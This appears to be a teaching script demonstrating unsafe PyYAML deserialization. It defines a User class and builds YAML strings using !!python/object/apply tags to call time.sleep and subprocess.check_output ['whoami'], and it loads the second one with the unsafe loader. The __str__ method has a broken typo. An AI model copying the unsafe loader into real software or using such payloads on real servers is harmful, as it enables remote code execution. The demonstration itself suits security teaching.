# Example Yaml Encoding / Decoding

import yaml
import time
#import subprocess

class User:
    def __init__(self, name, email, data=None):
        """
        Create a User
        """
        self.name = name
        self.email = email
        self.data = data

    def __str__(self):
        """Print the User"""
        return "User: {0} {1} {2}".format(self.name,
                                          self.email.
                                          self.data)
    
        
def dumpUser():
    """Example 1 Create and Dump a user"""
    theUser = User("Dang", "Dang@evil.org")
    #Turn the User into YAML
    out = yaml.dump(theUser)
    print(out)
    return out


def restoreUser():
    """Example 2: 
    
    Demonstrate how to restore a user
    """

    theStr="""
!!python/object:__main__.User
data: null
email: Dang@evil.org
name: Dang
"""
    
    theUser = yaml.load(theStr)
    print(theUser)


    
def restoreStr(theStr):
    """
    Generic Restore Function

    NOTE:  That we have manually specified the Unsafe version
    of the loader.

    """

    data = yaml.load(theStr, Loader=yaml.Loader)
    return data

    
#To Run the Code
if __name__ == "__main__":
    #First Example,  Working properly
    #dumpUser()

    #restoreUser()

    #String to play with 

    #import time  
    user = User("dang","dang", time.sleep)
    #print(yaml.dump(user))

    #Running this will make the server sleep for a second
    evilStr = """
!!python/object:__main__.User
data: !!python/object/apply:time.sleep [1]
email: dang
name: dang
"""
    #out = restoreStr(evilStr)
    #print(out)


    #This uses the subprocess function to run a module in the background
    evilStr = """
!!python/object:__main__.User
data:  !!python/object/apply:subprocess.check_output ['whoami']
email: dang
name: dang
"""
    out = yaml.load(evilStr, Loader=yaml.Loader)
    print(out.data)
